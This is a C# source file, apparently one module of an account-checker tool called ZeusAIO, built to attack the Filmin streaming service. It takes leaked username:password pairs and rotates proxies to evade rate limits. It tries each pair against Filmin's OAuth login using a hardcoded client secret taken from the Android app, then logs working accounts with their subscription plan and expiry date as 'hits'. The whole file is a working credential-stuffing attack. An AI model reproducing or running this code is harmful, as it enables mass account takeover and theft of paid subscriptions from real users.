using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using System.Security.Authentication;
using System.Net;
using checker;

namespace Flimin
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            StringBuilder capture = new StringBuilder();
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            req.AddHeader("Accept", "application/vnd.filmin.v1+json");
                            req.AddHeader("Cache-Control", "no-cache");
                            req.AddHeader("Accept-Encoding", "UTF-8");
                            req.AddHeader("X-Client-Identifier", "Android_v3.9.8_build101");
                            req.AddHeader("X-Client-Id", "j2Gal1ZDbCtdiRa9");
                            req.AddHeader("X-Client-Language", "es-ES");
                            req.AddHeader("Connection", "close");
                            req.AddHeader("User-Agent", "okhttp/3.8.0");

                            var res0 = req.Post("https://apiv3.filmin.es/oauth/access_token", "username=" + s[0] + "&client_id=j2Gal1ZDbCtdiRa9&client_secret=zPNBDTu01qXQHlqkNqK8iY8p7H8nmW7x&password=" + s[1] + "&grant_type=password", "application/x-www-form-urlencoded");
                            string text0 = res0.ToString();

                            if (Convert.ToInt32(res0.StatusCode) == 200)
                            {
                                var AT = Functions.JSON(text0, "access_token").FirstOrDefault();
                                req.AddHeader("Authorization", "Bearer " + AT + "");
                                req.AddHeader("Accept", "application/vnd.filmin.v1+json");
                                req.AddHeader("Cache-Control", "no-cache");
                                req.AddHeader("Accept-Encoding", "UTF-8");
                                req.AddHeader("X-Client-Identifier", "Android_v3.9.8_build101");
                                req.AddHeader("X-Client-Id", "j2Gal1ZDbCtdiRa9");
                                req.AddHeader("X-Client-Language", "es-ES");
                                req.AddHeader("Connection", "close");
                                req.AddHeader("User-Agent", "okhttp/3.8.0");

                                var res1 = req.Get("https://apiv3.filmin.es/user/");
                                string text1 = res1.ToString();

                                if (text1.Contains("subscriptions\":{\"data\":[]}"))
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - Flimin] - " + s[0] + ":" + s[1] + " | " + capture.ToString(), Color.OrangeRed);
                                    }
                                    Export.AsResult("/Flimin_frees", s[0] + ":" + s[1] + " | " + capture.ToString());
                                    return false;
                                }
                                else
                                {
                                    var Plan = Functions.JSON(text1, "name").FirstOrDefault();
                                    capture.Append(" | Plan = " + Plan);
                                    var ExpirationDate = Functions.JSON(text1, "expiration_date").FirstOrDefault();
                                    capture.Append(" | Expiration Date = " + ExpirationDate);
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - Flimin] - " + s[0] + ":" + s[1] + " | " + capture.ToString(), Color.Green);
                                    }
                                    Export.AsResult("/Flimin_hits", s[0] + ":" + s[1] + " | " + capture.ToString());
                                    ZeusAIO.mainmenu.hits++;
                                    return false;
                                }


                            }
                            else if (Convert.ToInt32(res0.StatusCode) == 401)
                            {
                                break;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }


                        }

                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}